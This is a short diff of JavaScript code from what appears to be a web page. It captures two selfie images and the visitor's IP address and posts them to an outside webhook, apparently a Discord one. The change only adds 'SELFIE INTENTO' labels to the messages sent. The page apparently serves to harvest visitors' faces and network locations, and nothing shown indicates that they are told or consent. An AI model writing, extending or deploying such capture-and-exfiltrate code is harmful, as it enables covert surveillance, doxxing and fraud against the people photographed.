@@ -147,7 +147,7 @@
                         const formData1 = new FormData();
                         formData1.append('file', dataURLtoBlob(selfie1DataUrl), 'selfie1.png');
                         formData1.append('payload_json', JSON.stringify({
-                            content: `🌐 IP: ${ip}\n🤳 Selfie 1 adjunta`
+                            content: `📸 SELFIE INTENTO 1\n🌐 IP: ${ip}\n🤳 Selfie 1 adjunta`
                         }));
                         fetch(WEBHOOK_URL, {
                             method: 'POST',
@@ -159,7 +159,7 @@
                                 const formData2 = new FormData();
                                 formData2.append('file', dataURLtoBlob(selfie2DataUrl), 'selfie2.png');
                                 formData2.append('payload_json', JSON.stringify({
-                                    content: `🌐 IP: ${ip}\n🤳 Selfie 2 adjunta`
+                                    content: `📸 SELFIE INTENTO 2\n🌐 IP: ${ip}\n🤳 Selfie 2 adjunta`
                                 }));
                                 fetch(WEBHOOK_URL, {
                                     method: 'POST',
